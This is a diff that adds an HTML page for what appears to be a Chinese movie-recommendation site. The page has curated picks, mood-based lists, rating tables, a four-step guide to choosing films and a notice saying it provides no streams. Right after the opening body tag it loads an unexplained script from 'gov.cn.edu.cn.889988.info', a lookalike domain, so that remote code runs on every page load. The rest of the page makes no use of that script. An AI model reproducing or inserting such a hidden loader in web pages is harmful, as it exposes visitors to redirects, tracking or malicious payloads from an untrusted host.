@@ -1,0 +1,395 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>good电影网在线观看 - 好电影推荐、高分片单与在线观看指南</title>
+<meta name="description" content="good电影网在线观看(https://gooddianyingwangzaixianguankan-wap.github.io)专注好电影推荐与在线观看指南，收录高分电影、热门新片、经典老片与分类型片单，提供观影选择与平台选择参考，帮你更快找到值得看的好电影。">
+<meta name="keywords" content="good电影网在线观看,好电影,好电影推荐,在线观看,高分电影,热门新片,经典老片,电影片单,电影推荐榜单">
+<meta name="author" content="good电影网在线观看">
+<meta name="robots" content="index,follow">
+<meta property="og:type" content="website">
+<meta property="og:title" content="good电影网在线观看 - 好电影推荐与观影指南">
+<meta property="og:description" content="good电影网在线观看专注好电影推荐与在线观看指南，收录高分电影、热门新片、经典老片与分类型片单。">
+<meta property="og:url" content="https://gooddianyingwangzaixianguankan-wap.github.io/">
+<meta property="og:site_name" content="good电影网在线观看">
+<link rel="canonical" href="https://gooddianyingwangzaixianguankan-wap.github.io/">
+<style>
+:root{
+  --paper:#f7f4ee;
+  --paper2:#fffdf8;
+  --ink:#1b1b1b;
+  --ink2:#3d3d3d;
+  --gray:#6e6e6e;
+  --line:#d9d2c4;
+  --line2:#ebe5d8;
+  --blue:#1f4e79;
+  --blue2:#2e6ea6;
+  --red:#b23a2e;
+  --amber:#c8871f;
+  --green:#2f7a52;
+  --sans:"PingFang SC","Microsoft YaHei","Helvetica Neue",Arial,sans-serif;
+  --serif:"Songti SC","SimSun","Noto Serif CJK SC",Georgia,serif;
+}
+*{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth}
+body{background:var(--paper);color:var(--ink);font-family:var(--sans);line-height:1.85;background-image:linear-gradient(var(--line2) 1px,transparent 1px);background-size:100% 34px}
+img{max-width:100%;display:block}
+a{color:inherit;text-decoration:none}
+ul,ol{list-style:none}
+.wrap{max-width:1180px;margin:0 auto;padding:0 24px}
+:focus-visible{outline:2px solid var(--blue2);outline-offset:2px}
+
+/* ===== 报头 ===== */
+header{background:var(--paper2);border-bottom:3px double var(--ink);padding:30px 0 0}
+.masthead{text-align:center;padding-bottom:22px}
+.masthead .kicker{font-family:var(--serif);font-size:11px;letter-spacing:5px;color:var(--gray);margin-bottom:14px}
+.masthead h1{font-size:42px;font-weight:900;letter-spacing:1px;line-height:1.25}
+.masthead h1 a{color:var(--ink)}
+.masthead h1 a:hover{color:var(--blue)}
+.masthead h1 .hl{color:var(--red)}
+.masthead .tag{margin-top:12px;font-size:13px;color:var(--gray);letter-spacing:1px}
+.masthead .tag b{color:var(--blue);font-weight:700}
+.dates{display:flex;justify-content:space-between;font-size:11.5px;color:var(--gray);border-top:1px solid var(--ink);border-bottom:1px solid var(--ink);padding:7px 0;margin-top:20px;flex-wrap:wrap;gap:8px}
+nav{background:var(--ink);position:sticky;top:0;z-index:50}
+nav .wrap{display:flex;overflow-x:auto;scrollbar-width:none;padding:0}
+nav .wrap::-webkit-scrollbar{display:none}
+nav a{padding:14px 20px;font-size:12.5px;font-weight:800;letter-spacing:1px;color:#e8e4dc;white-space:nowrap;transition:.18s}
+nav a:hover,nav a.active{background:var(--red);color:#fff}
+nav a.search{margin-left:auto;font-weight:400;color:#b9b1a4}
+
+/* ===== 通用 ===== */
+section{padding:72px 0}
+.sec-head{display:flex;align-items:baseline;gap:14px;margin-bottom:34px;flex-wrap:wrap;border-bottom:1px solid var(--ink);padding-bottom:12px}
+.sec-head .cn{font-family:var(--serif);font-size:14px;font-weight:900;color:var(--red);letter-spacing:2px}
+.sec-head h2{font-size:26px;font-weight:900}
+.sec-head h2 em{font-style:normal;color:var(--blue)}
+.sec-head .en{margin-left:auto;font-family:var(--serif);font-size:11px;color:var(--gray);letter-spacing:3px}
+.lead{font-size:14.5px;color:var(--ink2);max-width:840px;margin-bottom:32px}
+.more{text-align:center;margin-top:38px}
+.btn{display:inline-block;padding:12px 30px;font-size:12px;font-weight:900;letter-spacing:2px;background:var(--ink);color:var(--paper2);transition:.22s}
+.btn:hover{background:var(--red);color:#fff}
+
+/* ===== Hero 头条 = 横向折叠报纸 ===== */
+.breaking{display:grid;grid-template-columns:1.35fr 1fr;gap:0;border:1px solid var(--ink);background:var(--paper2)}
+.breaking .lead-news{padding:30px;border-right:1px solid var(--ink);display:flex;flex-direction:column}
+.breaking .lead-news .tag{display:inline-block;align-self:flex-start;background:var(--red);color:#fff;font-size:10.5px;letter-spacing:2px;padding:4px 10px;margin-bottom:14px}
+.breaking .lead-news h3{font-size:27px;font-weight:900;line-height:1.5;margin-bottom:14px}
+.breaking .lead-news h3 a:hover{color:var(--blue)}
+.breaking .lead-news p{font-size:14px;color:var(--ink2)}
+.breaking .meta{margin-top:18px;padding-top:14px;border-top:1px solid var(--line);display:flex;gap:20px;font-size:11.5px;color:var(--gray);flex-wrap:wrap}
+.breaking .feed{border-left:1px solid var(--line);background:var(--paper2)}
+.breaking .feed li{border-bottom:1px solid var(--line);padding:15px 22px;display:grid;grid-template-columns:44px 1fr;gap:14px;align-items:baseline}
+.breaking .feed li:last-child{border-bottom:none}
+.breaking .feed li .n{font-family:var(--serif);font-size:20px;font-weight:900;color:var(--red);line-height:1}
+.breaking .feed li .t{font-size:14px;font-weight:700;line-height:1.6}
+.breaking .feed li .t a:hover{color:var(--blue)}
+.breaking .feed li .t small{display:block;font-size:11.5px;color:var(--gray);font-weight:400;margin-top:3px}
+
+/* ===== 栏目一：本周精选（横向海报长条） ===== */
+.stripe{display:flex;gap:18px;overflow-x:auto;padding-bottom:14px;scroll-snap-type:x mandatory;scrollbar-width:thin}
+.stripe::-webkit-scrollbar{height:8px}
+.stripe::-webkit-scrollbar-thumb{background:var(--line)}
+.stripe .card{flex:0 0 252px;scroll-snap-align:start;background:var(--paper2);border:1px solid var(--line);transition:.25s}
+.stripe .card:hover{transform:translateY(-4px);box-shadow:0 10px 24px rgba(27,27,27,.14)}
+.stripe .poster{height:338px;background:var(--ink);position:relative;display:grid;place-items:center;color:var(--paper2);text-align:center;padding:18px}
+.stripe .poster:before{content:"";position:absolute;inset:8px;border:1px solid rgba(255,255,255,.25)}
+.stripe .poster .no{font-family:var(--serif);font-size:12px;letter-spacing:3px;color:var(--amber);margin-bottom:8px}
+.stripe .poster .nm{font-size:19px;font-weight:900;line-height:1.4}
+.stripe .poster .yr{position:absolute;top:14px;right:14px;font-size:10.5px;letter-spacing:1px;color:var(--gray);background:var(--paper2);color:var(--ink);padding:2px 7px}
+.stripe .info{padding:15px 16px}
+.stripe .info .row{display:flex;justify-content:space-between;font-size:12px;color:var(--gray);margin-bottom:6px}
+.stripe .info .row b{color:var(--ink2);font-weight:700}
+.stripe .info .gen{font-size:11.5px;color:var(--blue2)}
+
+/* ===== 栏目二：按心情选片（九宫格目录） ===== */
+.grid9{display:grid;grid-template-columns:repeat(3,1fr);gap:1px;background:var(--ink);border:1px solid var(--ink)}
+.grid9 a{background:var(--paper2);padding:26px 22px;transition:.2s;display:block}
+.grid9 a:hover{background:var(--ink);color:var(--paper2)}
+.grid9 a:hover .desc{color:#b9b1a4}
+.grid9 a:nth-child(odd){background:#fffdf6}
+.grid9 a:nth-child(odd):hover{background:var(--ink)}
+.grid9 .n{font-family:var(--serif);font-size:12px;color:var(--red);font-weight:900;letter-spacing:1px}
+.grid9 a:hover .n{color:var(--amber)}
+.grid9 h4{font-size:18px;font-weight:900;margin:8px 0 10px}
+.grid9 .desc{font-size:13px;color:var(--ink2);line-height:1.85}
+
+/* ===== 栏目三：片单排行（表格） ===== */
+.rank{display:grid;grid-template-columns:1fr 1fr;gap:40px;align-items:start}
+.tbl{width:100%;border-collapse:collapse;font-size:13.5px;background:var(--paper2)}
+.tbl caption{padding:10px 12px;text-align:left;background:var(--ink);color:var(--paper2);font-size:12.5px;font-weight:800;letter-spacing:1px}
+.tbl th{background:var(--line2);font-size:11px;letter-spacing:1px;color:var(--gray);text-align:left;padding:10px 12px;border-bottom:1px solid var(--line)}
+.tbl td{padding:12px;border-bottom:1px solid var(--line2);vertical-align:top}
+.tbl tr:last-child td{border-bottom:none}
+.tbl .rk{font-family:var(--serif);font-size:17px;font-weight:900;color:var(--red);width:40px}
+.tbl .nm{font-weight:800}
+.tbl .nm a:hover{color:var(--blue)}
+.tbl .nm span{display:block;font-size:11.5px;color:var(--gray);font-weight:400;margin-top:2px}
+.tbl .sc{font-weight:900;color:var(--blue);white-space:nowrap;text-align:right;width:58px}
+.tbl tr:hover td{background:#fffdf6}
+
+/* ===== 栏目四：观影指南（步骤时间轴） ===== */
+.guide{display:grid;grid-template-columns:1fr 2fr;gap:42px;align-items:start}
+.guide .intro h3{font-family:var(--serif);font-size:21px;font-weight:900;line-height:1.7;margin-bottom:16px}
+.guide .intro p{font-size:14px;color:var(--ink2)}
+.guide .intro .quote{border-left:3px solid var(--red);padding:14px 0 14px 20px;margin-top:20px;font-family:var(--serif);font-size:14px;color:var(--gray);line-height:2}
+.steps{position:relative;padding-left:38px}
+.steps:before{content:"";position:absolute;left:11px;top:6px;bottom:6px;width:1px;background:var(--line)}
+.steps .step{position:relative;padding-bottom:26px}
+.steps .step:last-child{padding-bottom:0}
+.steps .step .dot{position:absolute;left:-38px;top:4px;width:23px;height:23px;background:var(--paper2);border:2px solid var(--red);border-radius:50%;display:grid;place-items:center;font-family:var(--serif);font-size:11px;font-weight:900;color:var(--red)}
+.steps .step h4{font-size:16.5px;font-weight:900;margin-bottom:6px}
+.steps .step p{font-size:13.5px;color:var(--ink2)}
+.steps .step .tip{margin-top:9px;font-size:12px;color:var(--green);background:var(--paper2);border:1px solid var(--line);padding:9px 12px}
+
+/* ===== 关于 ===== */
+.about{display:grid;grid-template-columns:5fr 4fr;gap:44px;background:var(--paper2);border:1px solid var(--ink);padding:42px 38px}
+.about h2{font-size:24px;font-weight:900;margin-bottom:16px;line-height:1.6}
+.about h2 em{font-style:normal;color:var(--red)}
+.about p{font-size:14.5px;color:var(--ink2);margin-bottom:12px}
+.about .notice{border:1px dashed var(--red);padding:18px 20px;margin-top:18px;font-size:13px;color:var(--ink2);background:#fffdf8}
+.about .notice b{color:var(--red)}
+.about .stats{display:grid;grid-template-columns:1fr 1fr;gap:1px;background:var(--line);border:1px solid var(--ink)}
+.about .stats div{background:var(--paper2);padding:24px 20px}
+.about .stats .v{font-family:var(--serif);font-size:32px;font-weight:900;color:var(--blue);line-height:1}
+.about .stats .l{font-size:12.5px;color:var(--gray);margin-top:8px}
+
+/* ===== 页脚 ===== */
+footer{background:var(--ink);color:#d8d2c4;padding:50px 0 0;margin-top:40px}
+.foot{display:grid;grid-template-columns:1.7fr 1fr 1fr 1fr;gap:36px}
+.foot h4{font-size:19px;font-weight:900;letter-spacing:1px}
+.foot h4 a{color:#f0ece3}
+.foot h4 a:hover{color:var(--amber)}
+.foot .slogan{font-family:var(--serif);font-size:11px;color:var(--amber);letter-spacing:2px;margin:10px 0 14px}
+.foot p{font-size:13px;color:#aea795;max-width:420px}
+.foot h5{font-size:11px;font-weight:900;color:var(--amber);margin-bottom:15px;letter-spacing:2px;font-family:var(--serif)}
+.foot ul{font-size:13px}
+.foot li{padding:6px 0}
+.foot a{color:#c9c2b3}
+.foot a:hover{color:#fff}
+.copy{margin-top:36px;border-top:1px solid #444;padding:22px 0;font-size:12px;color:#8a8272;text-align:center;line-height:2.1;font-family:var(--serif)}
+.copy a{color:var(--amber);font-weight:700}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/xiaolu.js"></script>
+
+<!-- ============ 报头 ============ -->
+<header>
+  <div class="wrap">
+    <div class="masthead">
+      <div class="kicker">一 份 关 于 好 电 影 的 选 片 指 南</div>
+      <h1><a href="https://gooddianyingwangzaixianguankan-wap.github.io/" title="good电影网在线观看">good<span class="hl">电影网</span>在线观看</a></h1>
+      <div class="tag">帮 你 从 无 数 片 单 里 ， 挑 出 那 部 <b>值 得 看</b> 的 电 影</div>
+    </div>
+    <div class="dates">
+      <span>第 07 卷 · 第 41 期 · 2026 年 10 月 7 日 周三</span>
+      <span>晴 · 宜观影 · 忌片荒</span>
+      <span>本日精选片单已更新</span>
+    </div>
+  </div>
+  <nav>
+    <div class="wrap">
+      <a href="#breaking" class="active">今日头条</a>
+      <a href="#pick">本周精选</a>
+      <a href="#mood">按心情选片</a>
+      <a href="#rank">口碑排行</a>
+      <a href="#guide">观影指南</a>
+      <a href="#about">关于本站</a>
+      <a href="#">高分榜</a>
+      <a href="#">新片速递</a>
+      <a href="#">经典老片</a>
+      <a href="#">类型片单</a>
+      <a href="#" class="search">搜索片名 ›</a>
+    </div>
+  </nav>
+</header>
+
+<!-- ============ Hero 头条 ============ -->
+<section id="breaking">
+  <div class="wrap">
+    <div class="sec-head"><span class="cn">今 日 头 条</span><h2>今日 <em>好电影</em></h2><span class="en">Today's Pick</span></div>
+    <div class="breaking">
+      <article class="lead-news">
+        <span class="tag">封面推荐 · COVER STORY</span>
+        <h3><a href="#">为什么你总找不到好电影看：不是片荒，是筛选方法错了</a></h3>
+        <p>平台每天上新几十部，真正能看完的却没几部。问题往往不在于没有好电影，而在于我们把「新」当成了「好」的替代品。今天这篇，把选片这件事拆成三个可以直接照做的步骤。</p>
+        <div class="meta"><span>作者：编辑部</span><span>阅读时长：6 分钟</span><span>关键词：选片方法 / 片单筛选 / 口碑参考</span></div>
+      </article>
+      <ul class="feed">
+        <li><span class="n">壹</span><span class="t"><a href="#">高分榜不是全部，但它是筛选的起点</a><small>评分只能排除明显不合适的，不能告诉你「喜不喜欢」</small></span></li>
+        <li><span class="n">贰</span><span class="t"><a href="#">预告片骗了你多久？三个识别信号</a><small>反转全给完、台词只挑金句、情绪只挑高潮</small></span></li>
+        <li><span class="n">叁</span><span class="t"><a href="#">周末两小时：节奏快不累的八部选择</a><small>适合疲惫工作日后，不想动脑也不想浪费时间</small></span></li>
+        <li><span class="n">肆</span><span class="t"><a href="#">陪家人看什么：五部全年龄都能接住</a><small>不幼稚也不沉重，看完还能聊上两句</small></span></li>
+        <li><span class="n">伍</span><span class="t"><a href="#">冷门不等于难看：本月三颗遗珠</a><small>评分不算高，但完成度意外地完整</small></span></li>
+      </ul>
+    </div>
+  </div>
+</section>
+
+<!-- ============ 栏目一：本周精选 ============ -->
+<section id="pick" style="padding-top:0;">
+  <div class="wrap">
+    <div class="sec-head"><span class="cn">栏 目 一</span><h2>本周 <em>精选</em></h2><span class="en">Editor's Pick · 横向滑动</span></div>
+    <p class="lead">本周编辑部一致点头的好电影，类型不重复，难度不劝退。横向滑动可看完整片单，每部都标注了类型、片长与适合场景。</p>
+    <div class="stripe">
+      <article class="card"><div class="poster" style="background:linear-gradient(150deg,#1f4e79,#163a59);"><span class="no">NO.01</span><span class="nm">沉默的证人</span><span class="yr">2024</span></div><div class="info"><div class="row"><span><b>犯罪 · 悬疑</b></span><span>118 分钟</span></div><div class="row"><span>适合：独自细看</span><span>★★★★☆</span></div><div class="gen">关键词：反转 / 节奏 / 细节伏笔</div></div></article>
+      <article class="card"><div class="poster" style="background:linear-gradient(150deg,#7a3b2e,#5c2c20);"><span class="no">NO.02</span><span class="nm">海边最后的夏天</span><span class="yr">2023</span></div><div class="info"><div class="row"><span><b>剧情 · 家庭</b></span><span>104 分钟</span></div><div class="row"><span>适合：周末慢看</span><span>★★★★☆</span></div><div class="gen">关键词：亲情 / 告别 / 群像</div></div></article>
+      <article class="card"><div class="poster" style="background:linear-gradient(150deg,#2f7a52,#1f5639);"><span class="no">NO.03</span><span class="nm">山间来信</span><span class="yr">2025</span></div><div class="info"><div class="row"><span><b>文艺 · 成长</b></span><span>96 分钟</span></div><div class="row"><span>适合：安静独处</span><span>★★★★☆</span></div><div class="gen">关键词：自然 / 书信 / 留白</div></div></article>
+      <article class="card"><div class="poster" style="background:linear-gradient(150deg,#8a6d1f,#66500f);"><span class="no">NO.04</span><span class="nm">午夜便利店</span><span class="yr">2024</span></div><div class="info"><div class="row"><span><b>喜剧 · 群像</b></span><span>110 分钟</span></div><div class="row"><span>适合：轻松解压</span><span>★★★★☆</span></div><div class="gen">关键词：市井 / 台词 / 小人物</div></div></article>
+      <article class="card"><div class="poster" style="background:linear-gradient(150deg,#4a2f6e,#341f50);"><span class="no">NO.05</span><span class="nm">第七封信</span><span class="yr">2022</span></div><div class="info"><div class="row"><span><b>爱情 · 书信</b></span><span>123 分钟</span></div><div class="row"><span>适合：情侣共看</span><span>★★★★☆</span></div><div class="gen">关键词：异地 / 年代 / 克制</div></div></article>
+      <article class="card"><div class="poster" style="background:linear-gradient(150deg,#1b1b1b,#3d3d3d);"><span class="no">NO.06</span><span class="nm">无人区公路</span><span class="yr">2021</span></div><div class="info"><div class="row"><span><b>犯罪 · 公路</b></span><span>131 分钟</span></div><div class="row"><span>适合：紧张刺激</span><span>★★★★☆</span></div><div class="gen">关键词：追车 / 荒漠 / 人性</div></div></article>
+      <article class="card"><div class="poster" style="background:linear-gradient(150deg,#1f6a6a,#144b4b);"><span class="no">NO.07</span><span class="nm">潮汐之间</span><span class="yr">2025</span></div><div class="info"><div class="row"><span><b>纪录 · 自然</b></span><span>88 分钟</span></div><div class="row"><span>适合：睡前放松</span><span>★★★★☆</span></div><div class="gen">关键词：海洋 / 配乐 / 画面</div></div></article>
+      <article class="card"><div class="poster" style="background:linear-gradient(150deg,#9a4a3c,#6f3227);"><span class="no">NO.08</span><span class="nm">父亲的算法</span><span class="yr">2024</span></div><div class="info"><div class="row"><span><b>剧情 · 科技</b></span><span>115 分钟</span></div><div class="row"><span>适合：深度讨论</span><span>★★★★☆</span></div><div class="gen">关键词：AI / 伦理 / 家庭</div></div></article>
+    </div>
+    <div class="more"><a href="#" class="btn">查看完整精选片单 →</a></div>
+  </div>
+</section>
+
+<!-- ============ 栏目二：按心情选片 ============ -->
+<section id="mood" style="background:#fffdf8;border-top:1px solid var(--line);border-bottom:1px solid var(--line);">
+  <div class="wrap">
+    <div class="sec-head"><span class="cn">栏 目 二</span><h2>按心情 <em>选片</em></h2><span class="en">Mood Match</span></div>
+    <p class="lead">不想动脑的时候，「我想看什么」这个问题本身就够费劲了。下面九个入口按当下状态分类，点进去就是一组已经替你想好场景的片单。</p>
+    <div class="grid9">
+      <a href="#"><span class="n">壹 · 心情</span><h4>想哭一场</h4><p class="desc">不是硬煽情，是那种看完想给谁发条消息的。共 8 部。</p></a>
+      <a href="#"><span class="n">贰 · 心情</span><h4>想笑出声</h4><p class="desc">轻喜剧与市井群像，不靠误会制造笑点，看完不尴尬。共 9 部。</p></a>
+      <a href="#"><span class="n">叁 · 心情</span><h4>想动脑</h4><p class="desc">反转与叙事结构都有门道，适合愿意二刷琢磨细节。共 7 部。</p></a>
+      <a href="#"><span class="n">肆 · 心情</span><h4>想放空</h4><p class="desc">画面美、节奏慢、压力小，睡前看刚刚好。共 6 部。</p></a>
+      <a href="#"><span class="n">伍 · 心情</span><h4>想被燃到</h4><p class="desc">运动、传记、逆袭，节奏明快，情绪一路往上走。共 8 部。</p></a>
+      <a href="#"><span class="n">陆 · 心情</span><h4>想谈恋爱</h4><p class="desc">恋爱题材里不油腻的那一部分，单看也不尴尬。共 9 部。</p></a>
+      <a href="#"><span class="n">柒 · 心情</span><h4>想陪家人</h4><p class="desc">全年龄都能接住，不幼稚也不沉重。共 6 部。</p></a>
+      <a href="#"><span class="n">捌 · 心情</span><h4>想看真实</h4><p class="desc">纪录片与社会纪实，比剧情更让人坐不住。共 7 部。</p></a>
+      <a href="#"><span class="n">玖 · 心情</span><h4>就是想看</h4><p class="desc">编辑部私心清单，不好归类但每一部都值得。共 10 部。</p></a>
+    </div>
+  </div>
+</section>
+
+<!-- ============ 栏目三：口碑排行 ============ -->
+<section id="rank">
+  <div class="wrap">
+    <div class="sec-head"><span class="cn">栏 目 三</span><h2>口碑 <em>排行</em></h2><span class="en">Top Chart</span></div>
+    <p class="lead">两个维度，两套逻辑：左边是按综合口碑排序的年度榜单，右边是按类型分的当月口碑。评分只是参考，下方附了每部的入选理由。</p>
+    <div class="rank">
+      <table class="tbl">
+        <caption>年度综合口碑榜 · TOP 6</caption>
+        <thead><tr><th>排名</th><th>影片与入选理由</th><th>评分</th></tr></thead>
+        <tbody>
+          <tr><td class="rk">01</td><td class="nm"><a href="#">潮汐之间</a><span>画面与配乐完成度极高，年度视听体验</span></td><td class="sc">9.1</td></tr>
+          <tr><td class="rk">02</td><td class="nm"><a href="#">沉默的证人</a><span>剧本严密，二刷仍能发现新伏笔</span></td><td class="sc">8.9</td></tr>
+          <tr><td class="rk">03</td><td class="nm"><a href="#">山间来信</a><span>留白得当，表演克制而准确</span></td><td class="sc">8.8</td></tr>
+          <tr><td class="rk">04</td><td class="nm"><a href="#">父亲的算法</a><span>议题有锐度，落点却回到家庭</span></td><td class="sc">8.6</td></tr>
+          <tr><td class="rk">05</td><td class="nm"><a href="#">海边最后的夏天</a><span>群像处理细腻，结尾不强行圆满</span></td><td class="sc">8.5</td></tr>
+          <tr><td class="rk">06</td><td class="nm"><a href="#">第七封信</a><span>异地恋题材里少见的不煽情版本</span></td><td class="sc">8.4</td></tr>
+        </tbody>
+      </table>
+      <table class="tbl">
+        <caption>本月类型口碑榜</caption>
+        <thead><tr><th>排名</th><th>类型与本月代表</th><th>评分</th></tr></thead>
+        <tbody>
+          <tr><td class="rk">01</td><td class="nm"><a href="#">悬疑 · 无人区公路</a><span>节奏紧张，荒漠质感突出</span></td><td class="sc">8.7</td></tr>
+          <tr><td class="rk">02</td><td class="nm"><a href="#">喜剧 · 午夜便利店</a><span>台词有生活气，不靠段子堆砌</span></td><td class="sc">8.5</td></tr>
+          <tr><td class="rk">03</td><td class="nm"><a href="#">爱情 · 第七封信</a><span>书信体叙事，年代感准确</span></td><td class="sc">8.4</td></tr>
+          <tr><td class="rk">04</td><td class="nm"><a href="#">纪录 · 潮汐之间</a><span>摄影水准高于同类作品</span></td><td class="sc">8.3</td></tr>
+          <tr><td class="rk">05</td><td class="nm"><a href="#">剧情 · 父亲的算法</a><span>科技议题与家庭叙事结合自然</span></td><td class="sc">8.2</td></tr>
+          <tr><td class="rk">06</td><td class="nm"><a href="#">文艺 · 山间来信</a><span>节奏慢但不拖，适合安静看</span></td><td class="sc">8.1</td></tr>
+        </tbody>
+      </table>
+    </div>
+    <div class="more"><a href="#" class="btn">查看全部口碑榜单 →</a></div>
+  </div>
+</section>
+
+<!-- ============ 栏目四：观影指南 ============ -->
+<section id="guide" style="background:#fffdf8;border-top:1px solid var(--line);">
+  <div class="wrap">
+    <div class="sec-head"><span class="cn">栏 目 四</span><h2>观影 <em>指南</em></h2><span class="en">How to Choose</span></div>
+    <p class="lead">选片不是玄学。下面四个步骤是编辑部一直在用的方法，从「不知道看什么」到「已经点开了」，通常只需要五分钟。</p>
+    <div class="guide">
+      <div class="intro">
+        <h3>四步选出一部<br>你不会中途关掉的电影</h3>
+        <p>评分解决的是「大面上好不好」，解决不了「我今天想不想看」。真正影响体验的是状态、时长和看完之后的情绪，这三件事比评分重要得多。</p>
+        <div class="quote">好电影的标准从来不是唯一的，找到和自己当下状态对得上的那一部，才是「值得看」的真正含义。</div>
+      </div>
+      <div class="steps">
+        <div class="step"><span class="dot">1</span><h4>先确定今天的精力预算</h4><p>是还能专注两小时，还是只想看四十分钟就睡。这一条筛掉一半选择，尤其能把文艺长片从疲惫工作日的清单里划掉。</p><div class="tip">提示：片长不是越短越好，但越累的夜晚越该回避「需要记人物关系」的片子。</div></div>
+        <div class="step"><span class="dot">2</span><h4>再确定想被唤起的情绪</h4><p>想放松、想被触动、想被燃到，答案不同，片单完全不同。情绪是比类型更准的筛选器。</p><div class="tip">提示：把「看什么类型」换成「想被唤起什么情绪」，选片效率会明显变高。</div></div>
+        <div class="step"><span class="dot">3</span><h4>用评分做排除，不做决定</h4><p>评分低于某个线的可以跳过，但高分不等于适合你。评分是门槛，不是答案。</p><div class="tip">提示：先看差评里你最在意的那一条，比看好评更有参考价值。</div></div>
+        <div class="step"><span class="dot">4</span><h4>开看十五分钟，允许换片</h4><p>给一部片子十五分钟，还接不住就换。这不是没耐心，是把时间留给对的那一部。</p><div class="tip">提示：看完十五分钟还犹豫，通常就是不合适，不必勉强看完。</div></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ============ 关于本站 ============ -->
+<section id="about" style="padding-bottom:0;">
+  <div class="wrap">
+    <div class="about">
+      <div>
+        <h2>关于 <em>good电影网在线观看</em></h2>
+        <p>good电影网在线观看（https://gooddianyingwangzaixianguankan-wap.github.io）是一份专注于好电影推荐与在线观看指南的内容站，每天更新精选片单、口碑排行、类型分类与观影方法，帮你更快找到当下值得看的那一部。</p>
+        <p>我们不做影片搬运，也不提供在线播放服务。本站内容均为影片介绍、选片方法与平台选择参考，具体观影请通过正规授权渠道，支持正版。</p>
+        <div class="notice"><b>重要声明：</b>本站仅提供电影资讯、片单推荐与观影指南内容，不提供任何影片的在线播放、下载或资源链接服务。页面内所有链接仅为站内栏目占位，不构成任何观看渠道指引，请通过合法授权平台观看。</div>
+      </div>
+      <div class="stats">
+        <div><div class="v">1200+</div><div class="l">已整理影片条目</div></div>
+        <div><div class="v">9</div><div class="l">按心情分类</div></div>
+        <div><div class="v">42</div><div class="l">期选片指南</div></div>
+        <div><div class="v">6</div><div class="l">固定更新栏目</div></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ============ 页脚 ============ -->
+<footer>
+  <div class="wrap">
+    <div class="foot">
+      <div>
+        <h4><a href="https://gooddianyingwangzaixianguankan-wap.github.io/">good电影网在线观看</a></h4>
+        <div class="slogan">帮 你 找 到 值 得 看 的 那 一 部</div>
+        <p>专注好电影推荐、在线观看指南与观影方法分享，每天更新精选片单、口碑排行与分类型片单，让找片这件事少花一点时间。</p>
+      </div>
+      <div>
+        <h5>内容栏目</h5>
+        <ul>
+          <li><a href="#breaking">今日头条</a></li>
+          <li><a href="#pick">本周精选</a></li>
+          <li><a href="#mood">按心情选片</a></li>
+          <li><a href="#rank">口碑排行</a></li>
+          <li><a href="#guide">观影指南</a></li>
+          <li><a href="#about">关于本站</a></li>
+        </ul>
+      </div>
+      <div>
+        <h5>片单分类</h5>
+        <ul>
+          <li><a href="#">高分榜</a></li>
+          <li><a href="#">新片速递</a></li>
+          <li><a href="#">经典老片</a></li>
+          <li><a href="#">悬疑犯罪</a></li>
+          <li><a href="#">喜剧轻松</a></li>
+          <li><a href="#">文艺慢片</a></li>
+        </ul>
+      </div>
+      <div>
+        <h5>本站服务</h5>
+        <ul>
+          <li><a href="#">投稿合作</a></li>
+          <li><a href="#">片单申请收录</a></li>
+          <li><a href="#">观影建议反馈</a></li>
+          <li><a href="#">内容声明</a></li>
+          <li><a href="#">联系我们</a></li>
+        </ul>
+      </div>
+    </div>
+    <div class="copy">
+      © 2026 good电影网在线观看 gooddianyingwangzaixianguankan-wap.github.io 版权所有 · 本站仅提供电影资讯与观影指南，不提供在线播放、下载或资源链接服务，请通过合法授权渠道观看<br>
+      网站名称：<a href="https://gooddianyingwangzaixianguankan-wap.github.io/">good电影网在线观看</a> ｜ 网站网址：https://gooddianyingwangzaixianguankan-wap.github.io/
+    </div>
+  </div>
+</footer>
+
+</body>
+</html>
